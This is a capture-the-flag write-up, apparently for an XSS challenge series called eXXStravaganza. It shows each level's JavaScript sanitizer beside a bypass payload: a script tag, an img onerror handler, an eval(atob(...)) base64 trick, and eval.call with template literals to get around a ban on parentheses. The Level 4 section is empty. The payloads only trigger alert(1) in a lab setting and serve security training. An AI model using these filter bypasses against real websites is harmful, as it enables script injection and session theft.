
# eXXStravaganza 
For the eXXStravaganza series, one must exploit an XSS vulnerability that triggers an "alert(1)" without any user interaction. The challenges in this series all occur in the same way :
- Sanitizer (javascript source code that processes our input). 
- Input (text area where we enter the payload )
- Output (frame that shows us the output of the html page)
- MiniBrowser (browser where our html page is rendered)
![](./images/xss1.png)

# Level 1 
This is the first level , very simple , a warmup 
just enter `<script>alert(1)</script>` as input to trigger the alert 

# Level 2
Sanitizer : 
```javascript
function sanitize(input) {
    // no scripts!
    if (input.toLowerCase().includes('script')) {
        return 'NO!';
    }
    return input;
}
```
In this case we cannot use the `<script>` tag and there are many ways to bypass it , I used the `<img>` tag :
```html
<img/src=x onerror=alert(1)>
```

# Level 3
Sanitizer
```javascript
function sanitize(input) {
    // no alert!
    if (input.toLowerCase().includes('alert')) {
        return 'NO!';
    }
    return input;
}
```
In this case we cannot use the word `alert` , so we can use a base64 encoding and run it with `eval()` function :
```html
<script> eval(atob("YWxlcnQoMSk=")) </script>
```
# Level 4



# Level 5
Sanitizer : 
```javascript
function sanitize(input) {
    // no equals, no parentheses!
    return input.replace(/[=(]/g, '');
}
```
In this case there is a regex that prevents us from using parentheses and equals `(=`
So I used this payload: 
```javascript
<script> eval.call`${"alert\x281\x29"}`</script>
```
Here you can find the explanation of [call() function](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/call) and [Template Literals](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals)



